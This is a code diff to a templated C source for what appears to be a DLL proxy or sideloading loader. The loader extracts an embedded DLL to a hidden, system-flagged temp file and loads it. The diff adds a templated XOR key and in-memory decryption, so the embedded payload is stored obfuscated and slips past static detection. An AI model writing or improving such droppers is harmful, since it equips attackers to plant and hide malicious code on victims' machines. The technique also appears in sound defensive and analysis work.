@@ -45,6 +45,9 @@ void resolve_exports(HMODULE hOriginal) {
 }
 
 {% if embed_enabled %}
+static const unsigned char _rk[] = { {{ xor_key | join(', ') }} };
+static const unsigned int _rkl = {{ xor_key | length }};
+
 /* --- Extract embedded DLL and load it --- */
 static void _mkdirs(const char *path) {
     char buf[MAX_PATH];
@@ -88,13 +91,21 @@ static BOOL load_embedded_dll(void) {
         if (hOriginalDll) return TRUE;
     }
 
+    /* Decrypt resource data in memory */
+    unsigned char *pClear = (unsigned char *)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!pClear) return FALSE;
+    const unsigned char *pSrc = (const unsigned char *)pData;
+    for (DWORD i = 0; i < dwSize; i++)
+        pClear[i] = pSrc[i] ^ _rk[i % _rkl];
+
     HANDLE hFile = CreateFileA(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    if (hFile == INVALID_HANDLE_VALUE) { VirtualFree(pClear, 0, MEM_RELEASE); return FALSE; }
 
     DWORD dwWritten;
-    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
+    WriteFile(hFile, pClear, dwSize, &dwWritten, NULL);
     CloseHandle(hFile);
+    VirtualFree(pClear, 0, MEM_RELEASE);
 
     if (dwWritten != dwSize) return FALSE;
 
